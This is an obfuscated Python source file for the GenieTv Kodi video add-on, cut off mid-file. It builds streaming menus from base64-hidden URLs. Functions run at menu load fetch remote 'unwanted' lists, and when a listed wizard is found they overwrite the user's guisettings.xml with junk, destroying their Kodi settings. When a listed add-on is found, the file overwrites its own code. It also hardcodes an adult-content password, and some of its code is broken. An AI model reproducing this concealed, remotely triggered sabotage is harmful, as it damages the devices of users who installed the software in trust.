# -*- coding: cp1252 -*-
import xbmc , xbmcaddon , xbmcgui , xbmcplugin , os , base64 , sys , xbmcvfs , unicodedata
import urlresolver
from imports import cloudflare , googleplus , client , cleantitle
from imports import yt
import httplib
import requests
import urlparse
import shutil
import binascii
import subprocess
import urllib2 , urllib , glob , traceback
import re
from imports import extract
from imports import downloader
import plugintools
import zipfile
import time
import ntpath
import cookielib
from imports import Parse , CNF_Studio_Indexer
try :
 import json
except :
 import simplejson as json
from urllib2 import urlopen
from bs4 import BeautifulSoup
from BeautifulSoup import BeautifulStoneSoup , BeautifulSOAP
from cookielib import CookieJar
from addon . common . addon import Addon
from addon . common . net import Net
from imports . tvGuide import gui
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = ''
def oo ( i , t1 , t2 = [ ] ) :
 i1iII1IiiIiI1 = o0OO00
 for iIiiiI1IiI1I1 in t1 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 for iIiiiI1IiI1I1 in t2 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 return i1iII1IiiIiI1
 if 87 - 87: OoOoOO00
 if 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI
 if 73 - 73: OOooOOo / ii11ii1ii
O00ooOO = "2.7.5"
I1iII1iiII = xbmc . translatePath ( 'special://home/addons/repository.GenieTv' )
iI1Ii11111iIi = xbmc . translatePath ( 'special://home/addons/' )
i1i1II = xbmc . translatePath ( 'special://home/addonsbroke/' )
O0oo0OO0 = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3'
I1i1iiI1 = 'plugin.video.GenieTv'
iiIIIII1i1iI = [ 'plugin.video.GenieTv' , 'script.module.addon.common' , 'repository.GenieTv' ]
o0oO0 = xbmcaddon . Addon ( id = I1i1iiI1 )
oo00 = xbmc . translatePath ( 'special://home/media' )
o00 = 'plugin.video.GenieTv'
Oo0oO0ooo = xbmcgui . DialogProgress ( )
o0oOoO00o = "[COLORgreen]GenieTv[/COLOR]"
i1 = Net ( )
oOOoo00O0O = xbmcgui . Dialog ( )
i1111 = base64 . decodestring
i11 = o0oO0 . getSetting ( 'Build' )
I11 = o0oO0 . getSetting ( 'Local' )
Oo0o0000o0o0 = o0oO0 . getSetting ( 'Remote' )
oOo0oooo00o = o0oO0 . getSetting ( 'LocalM3u' )
oO0o0o0ooO0oO = o0oO0 . getSetting ( 'User' )
oo0o0O00 = o0oO0 . getSetting ( 'Pass' )
oO = o0oO0 . getSetting ( 'AdultPass' )
i1iiIIiiI111 = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'fanart.jpg' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'icon.png' , i1iiIII111ii , '' ) )
ii11iIi1I = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQv' ) )
iI111I11I1I1 = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQvb3JpZ2luLnBuZw==' ) )
OOooO0OOoo = xbmc . translatePath ( 'special://database' )
iIii1 = xbmc . translatePath ( 'special://home/userdata/addon_data/plugin.video.GenieTV' )
oOOoO0 = xbmc . translatePath ( 'special://thumbnails' ) ;
O0OoO000O0OO = "GenieTv"
iiI1IiI = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20=' ) )
II = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv' ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/Change_Log_Temp' ) )
OooO0 = 'http://'
II11iiii1Ii = base64 . decodestring ( 'LnBocA==' )
OO0o = base64 . decodestring ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC8=' )
Ooo = [ ]
O0o0Oo = o0oO0 . getLocalizedString
Oo00OOOOO = CookieJar ( )
O0O = urllib2 . build_opener ( urllib2 . HTTPCookieProcessor ( Oo00OOOOO ) )
O0O . addheaders = [ ( 'User-Agent' , 'Mozilla/5.0' ) ]
O00o0OO = int ( sys . argv [ 1 ] )
I11i1 = xbmc . translatePath ( o0oO0 . getAddonInfo ( 'profile' ) . decode ( 'utf-8' ) )
iIi1ii1I1 = os . path . join ( I11i1 , 'favorites' )
o0 = iIii1 + '/addons.ini'
I11II1i = xbmc . translatePath ( 'special://home/userdata/' )
IIIII = xbmc . translatePath ( 'special://home/userdatabroke/' )
ooooooO0oo = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9QYW5zQm94L09SSUdJTlMv' ) )
IIiiiiiiIi1I1 = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/script.ivueguide/master.db' ) )
I1IIIii = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , 'favourites.xml' ) )
oOoOooOo0o0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/plugin.video.GenieTv/favorites' ) )
if os . path . exists ( iIi1ii1I1 ) == True :
 OOOO = open ( iIi1ii1I1 ) . read ( )
else : OOOO = [ ]
OOO00 = o0oO0 . getSetting ( 'debug' )
if os . path . exists ( iIii1 ) == False :
 os . makedirs ( iIii1 )
 if 21 - 21: ii - Ii11I
 if 69 - 69: OOOO00ooo0Ooo % OOooOooo % O00oo0OO0oOOO * i1i1i11IIi . o0OOOoO0 / OO0O
def oOooOOo00Oo0O ( ) :
 if not os . path . exists ( I1iII1iiII ) :
  oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will only work with" , 'its official repo please install from trusted source' , '' )
  O00oO = 'genie tv repo not being installed '
  I11i1I1I ( O00oO )
 else :
  if not os . path . exists ( xbmc . translatePath ( os . path . join ( 'special://home/addons/service.xbmc.cleanse' ) ) ) :
   O00oO = 'genie tv repo not being installed '
   I11i1I1I ( O00oO )
  else :
   pass
def oO0Oo ( ) :
 oOooOOo00Oo0O ( )
 oOOoo0Oo ( )
 o00OO00OoO ( )
 OOOO0OOoO0O0 ( )
 if o0oO0 . getSetting ( 'My Build' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]WIZARD[/COLOR]' , iiI1IiI , 4001 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Streams' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]STREAMS[/COLOR]' , iiI1IiI , 4002 , ii11iIi1I + 'streams.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Music' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]Music[/COLOR]' , iiI1IiI , 4003 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
  if 75 - 75: ii . Ooo00oOo00o * Ii11I
 if o0oO0 . getSetting ( 'Builders Toolbox' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]BUILDERS TOOLBOX[/COLOR]' , iiI1IiI , 32 , ii11iIi1I + 'builderstoolbox.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Source List' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]SOURCE LIST[/COLOR]' , iiI1IiI , 46 , ii11iIi1I + 'sources.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Maintainance' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]MAINTENANCE[/COLOR]' , iiI1IiI , 3 , ii11iIi1I + 'MAIN6.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]ADDONS[/COLOR]' , '' , 10050 , ii11iIi1I + 'ADDONS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'APK Tool' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]APK TOOL[/COLOR]' , iiI1IiI , 2 , ii11iIi1I + 'APK.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Rss Feed' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]GenieTv RSS Feed[/COLOR]' , iiI1IiI , 39 , ii11iIi1I + 'RSS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons Packs' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]ADDONS PACKS[/COLOR]' , iiI1IiI , 30 , ii11iIi1I + 'ADDONP.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 25 - 25: I1IiI . OoOoOO00 / O00oo0OO0oOOO . Ii11I * Ooo00oOo00o . OOOo0
def Oo0oOOo ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]BACKUP MY BUILD[/COLOR]' , iiI1IiI , 10060 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]RESTORE MY BUILD[/COLOR]' , iiI1IiI , 49 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]WIPE GENIE[/COLOR]' , iiI1IiI , 41 , ii11iIi1I + 'wipegenie.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]WISHES PC[/COLOR]' , iiI1IiI , 1 , ii11iIi1I + 'WISHESPC.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]WISHES ANDROID[/COLOR]' , iiI1IiI , 44 , ii11iIi1I + 'WISHESAN.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
def Oo0OoO00oOO0o ( ) :
 oOooOOo00Oo0O ( )
 if oO == '5knuckleshuffle' :
  O0Oo000ooO00 ( '[COLORgreen]XVID[/COLOR]' , iiI1IiI , 10100 , ii11iIi1I + 'JIZBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Favourites' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]FAVOURITES[/COLOR]' , iiI1IiI , 10057 , ii11iIi1I + 'FAVORITES.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Search' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]SEARCH[/COLOR]' , iiI1IiI , 9000 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Live TV[/COLOR]' , iiI1IiI , 4009 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]MOVIES[/COLOR]' , iiI1IiI , 4004 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]TV SHOWS[/COLOR]' , iiI1IiI , 4005 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]STREAM TEAM[/COLOR]' , iiI1IiI , 4006 , ii11iIi1I + 'streamteam.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 4007 , ii11iIi1I + 'KIDSv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]HOBBIES[/COLOR]' , iiI1IiI , 4008 , ii11iIi1I + 'hobbies.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'YOUTUBE' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]SEARCH YOUTUBE[/COLOR]' , iiI1IiI , 10064 , ii11iIi1I + 'youtube.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'REQUESTS' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]REQUESTS[/COLOR]' , iiI1IiI + ( i1111 ( 'L1JFUVVFU1RTLnBocA==' ) ) , 10066 , ii11iIi1I + 'requests.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Stand Up' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]STAND UP[/COLOR]' , '' , 10003 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Documentaries' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]DOCUMENTARIES[/COLOR]' , iiI1IiI , 8040 , ii11iIi1I + 'documentary.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Disclose' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]DISCLOSE TV[/COLOR]' , iiI1IiI , 7001 , ii11iIi1I + 'disclose.png' , i1iiIII111ii , '' )
  if 80 - 80: ii + Ii11I - Ii11I % O00oo0OO0oOOO
  if 63 - 63: OOOo0 - ii11ii1ii + O0 % OOOO00ooo0Ooo / iIii1I11I1II1 / OOooOOo
 if o0oO0 . getSetting ( 'Playlist Loader' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]PLAYLIST LOADER[/COLOR]' , iiI1IiI , 3000 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
  if 98 - 98: O00oo0OO0oOOO * O00oo0OO0oOOO / O00oo0OO0oOOO + OOOO00ooo0Ooo
  if 34 - 34: OO0O
  if 15 - 15: OOOO00ooo0Ooo * OO0O * Oo % i11iIiiIii % I1IiI - Ii11I
  if 68 - 68: o0OOOoO0 % i1IIi . i1i1i11IIi . ii11ii1ii
  if 92 - 92: O00oo0OO0oOOO . o0OOOoO0
  if 31 - 31: o0OOOoO0 . I1IiI / O0
  if 89 - 89: I1IiI
  if 68 - 68: Ooo00oOo00o * OoooooooOO % O0 + Ooo00oOo00o + OO0O
  if 4 - 4: OO0O + O0 * Ii11I
  if 55 - 55: Oo + iIii1I11I1II1 / I1IiI * ii - i11iIiiIii - OOooOooo
  if 25 - 25: ii11ii1ii
  if 7 - 7: i1IIi / OOOo0 * o0OOOoO0 . i1i1i11IIi . iIii1I11I1II1
  if 13 - 13: Ii11I / i11iIiiIii
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 2 - 2: OOOo0 / O0 / OOooOOo % I1IiI % OOooOooo
def oOOoo0Oo ( ) :
 if not os . path . exists ( ooOoOoo0O ) :
  o0o00OO0 ( 'Change Log 24/04/16 - v2.7.1' , 'Just a little one to add in [COLORred]ITV section[/COLOR] into [COLORblue]streams - stream team[/COLOR], it is a film noir section for you fans. Hope you enjoy' )
  os . makedirs ( ooOoOoo0O )
  if 7 - 7: Ii11I + o0OOOoO0 + O0
  if 9 - 9: OoOoOO00 . OOooOOo - OO0O / OOooOOo
def I11OoOoOOOoOO ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Popcorn Box' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]POPCORN BOX[/COLOR]' , iiI1IiI , 7061 , ii11iIi1I + 'popcorn.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Film Trailers[/COLOR]' , i1111 ( 'aHR0cDovL3RoZW1vdmllYm94Lm5ldC9leHBsb3Jl' ) , 10068 , ii11iIi1I + 'movietrailers.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC MOVIES' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]CLASSIC MOVIES[/COLOR]' , '' , 8060 , ii11iIi1I + 'classicmovies.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
def ii1ii11IIIiiI ( ) :
 oOooOOo00Oo0O ( )
 if o0oO0 . getSetting ( 'G-tv' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]G-Tv PRIVATE LIST[/COLOR]' , '' , 10058 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'TV GUIDE' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]TV GUIDE[/COLOR]' , '' , 10063 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Link GTV Donators Username and Password to Guide[/COLOR]' , '' , 4010 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if 77 - 77: O00oo0OO0oOOO % O00oo0OO0oOOO * ii - i11iIiiIii
 if 93 - 93: OoooooooOO / OOOo0 % i11iIiiIii + ii11ii1ii * Ooo00oOo00o
def I1 ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Dizzy Tv' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]DIZZY TV[/COLOR]' , '' , 10018 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Watch Series' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]WATCH SERIES[/COLOR]' , '' , 10040 , ii11iIi1I + 'WATCHSERIES.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]iWATCH SERIES[/COLOR]' , '' , 8020 , ii11iIi1I + 'iwatch.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Recent Episodes' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]RECENT EPISODES[/COLOR]' , iiI1IiI , 8081 , ii11iIi1I + 'recent.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC TV' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]CLASSIC TV[/COLOR]' , iiI1IiI , 8064 , ii11iIi1I + 'classictv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]TV Show Trailers[/COLOR]' , i1111 ( 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj03WkZJUzJBcUF6OCZsaXN0PVBMM2t4NWgyVHJZR3dwVzBWYk5lbnBqLUJLTUJUR2dKUEU=' ) , 10069 , ii11iIi1I + 'tvtrailers.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]TV Show Schedule[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'tvschedule.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
def iI11Ii ( ) :
 oOooOOo00Oo0O ( )
 if o0oO0 . getSetting ( 'Scooby Streams' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , iiI1IiI , 1023 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'The Reaper' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]THE REAPER[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'reap.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Pandoras Box' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]PANDORAS BOX[/COLOR]' , iiI1IiI , 10025 , ii11iIi1I + 'PANDORASBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'HeroVision' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]HEROVISION[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tYWluLnBocA==' ) ) , 1016 , ii11iIi1I + 'hero.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Silent Hunter' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 10084 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Redemption Streams' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]Redemption Streams[/COLOR]' , ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'redemption.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]ITV[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9tYWluLnBocA==' ) ) , 1016 , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9pdHZzdHJlYW1zLnBuZw==' ) ) , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 6 - 6: ii
def oOOo0oOo0 ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 1006 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]SILENT HUNTER SCRAPES[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if 49 - 49: Oo . i11iIiiIii - i1IIi / OoOoOO00 . OOOo0
 if 1 - 1: Oo / OOooOOo % O00oo0OO0oOOO * i1i1i11IIi . i11iIiiIii
 if 2 - 2: ii11ii1ii * OOOO00ooo0Ooo - iIii1I11I1II1 + OOOo0 . ii % O00oo0OO0oOOO
def ooOOOoOooOoO ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'WCO' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]WATCH CARTOONS ONLINE[/COLOR]' , iiI1IiI , 21004 , ii11iIi1I + 'watchcartoons.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Cartoons' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 10001 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Anime' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]AnimeLand[/COLOR]' , ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2R1YmJlZC1hbmltZQ==' ) ) , 10004 , ii11iIi1I + 'anime.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
def o00oooO0Oo ( ) :
 oOooOOo00Oo0O ( )
 if o0oO0 . getSetting ( 'Football' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]FOOTBALL[/COLOR]' , '' , 10002 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Fitness' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]FITNESS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cuZml0bmVzc2JsZW5kZXIuY29tL3ZpZGVvcw==' ) ) , 7085 , ii11iIi1I + 'FITNESS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Go Fishing' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]Go Fishing[/COLOR]' , iiI1IiI , 8090 , ii11iIi1I + 'gofish.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'GenieTv Kitchen' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]GenieTv Kitchen[/COLOR]' , ( i1111 ( 'aHR0cDovL2Zvb2QubmR0di5jb20vdmlkZW9z' ) ) , 8045 , ii11iIi1I + 'geniekitchen.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 78 - 78: OOooOooo % o0OOOoO0 + ii11ii1ii
 if 64 - 64: ii * O0 . OOOo0 + OoOoOO00
 if 6 - 6: I1IiI / O00oo0OO0oOOO . i1i1i11IIi . i1i1i11IIi
def OOOO0OOoO0O0 ( ) :
 OO00O0O = iii ( 'http://architects.x10host.com/wizarddelete.txt' )
 oOooOOOoOo = re . compile ( '<unwanted_wizard =(.+?)</unwanted_wizard>' ) . findall ( OO00O0O )
 for i1Iii1i1I in oOooOOOoOo :
  print i1Iii1i1I
  i1Iii1i1I = ( str ( i1Iii1i1I ) )
  if os . path . exists ( xbmc . translatePath ( i1Iii1i1I ) ) :
   OOoO00 = os . path . join ( I11II1i , 'guisettings.xml' )
   IiI111111IIII = open ( OOoO00 , "w+" )
   if 37 - 37: o0OOOoO0 / I1IiI
   IiI111111IIII . write ( r'.' )
   i1I1iI1iIi111i ( )
  else :
   pass
   if 44 - 44: i1IIi % OoOoOO00 + OOOO00ooo0Ooo
def o00OO00OoO ( ) :
 OO00O0O = iii ( 'http://architects.x10host.com/testdelete.txt' )
 oOooOOOoOo = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( OO00O0O )
 for O00oO in oOooOOOoOo :
  O00oO = ( str ( O00oO ) )
  if os . path . exists ( xbmc . translatePath ( O00oO ) ) :
   I11i1I1I ( O00oO )
   I1I1I ( )
  else :
   pass
   if 95 - 95: OoOoOO00 + OOooOOo + O00oo0OO0oOOO * iIii1I11I1II1 % ii / i1i1i11IIi
def I11i1I1I ( addon ) :
 oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will not work with" , addon , 'please remove then reinstall genie' )
 OOoO00 = os . path . join ( II , 'default.py' )
 IiI111111IIII = open ( OOoO00 , "w+" )
 if 56 - 56: O00oo0OO0oOOO
 IiI111111IIII . write ( r'Genie Tv will not work with certain addons in an attempt to bring you original content from the best developers' )
 IiI111111IIII . write ( r'and not those simply out to profit or make a name for themselves off others work' )
 IiI111111IIII . write ( r'Please remove' + unwanted_addons + 'if you would like to use genie tv then uninstall and reinstall from official repo' )
 if 86 - 86: OoOoOO00 % o0OOOoO0
 if 15 - 15: i1IIi * OOOo0 + i11iIiiIii
def i1I1iI1iIi111i ( ) :
 OO00O0O = iii ( i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) )
 I1Ii = re . compile ( '<tr>.+?title="(.+?)">(.+?)</tr>' , re . DOTALL ) . findall ( OO00O0O )
 for O0oo00o0O , I1Ii in I1Ii :
  O0oo00o0O = O0oo00o0O
  oOooOOOoOo = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)\n</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( I1Ii ) )
  for i1I1I , iiI1I in oOooOOOoOo :
   o0o00OO0 ( O0oo00o0O , i1I1I , iiI1I )
   if 12 - 12: i11iIiiIii - i1IIi - Ooo00oOo00o . i1IIi - Ii11I + O0
   if 98 - 98: OOooOOo
   if 51 - 51: Oo - ii + OoOoOO00 * OOooOooo . OOOO00ooo0Ooo + ii
   if 78 - 78: i11iIiiIii / O00oo0OO0oOOO - OOooOooo / Ii11I + ii
   if 82 - 82: OOooOooo
   if 46 - 46: OoooooooOO . i11iIiiIii
   if 94 - 94: OOooOOo * OOooOooo / Oo / OOooOooo
   if 87 - 87: Oo . i1i1i11IIi
   if 75 - 75: OO0O + I1IiI + OOooOOo * OOOO00ooo0Ooo % ii . O00oo0OO0oOOO
   if 55 - 55: Ii11I . OOOo0
   if 61 - 61: Oo % i1i1i11IIi . Oo
   if 100 - 100: o0OOOoO0 * O0
   if 64 - 64: Ii11I % iIii1I11I1II1 * ii
   if 79 - 79: O0
   if 78 - 78: ii11ii1ii + Ii11I - o0OOOoO0
   if 38 - 38: OOooOOo - ii + iIii1I11I1II1 / I1IiI % Oo
   if 57 - 57: Ooo00oOo00o / OO0O
def Ii1I1Ii ( ) :
 O0Oo000ooO00 ( 'Genre' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10073 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( 'Most Viewed' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10077 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( 'Box Office' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9jYXRlZ29yeS9ib3gtb2ZmaWNlLw==' ) , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( 'Search' , '' , 10078 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 if 69 - 69: OOOo0 / OOooOOo . i1i1i11IIi * o0OOOoO0 % OOooOooo - OOooOOo
def i1i ( ) :
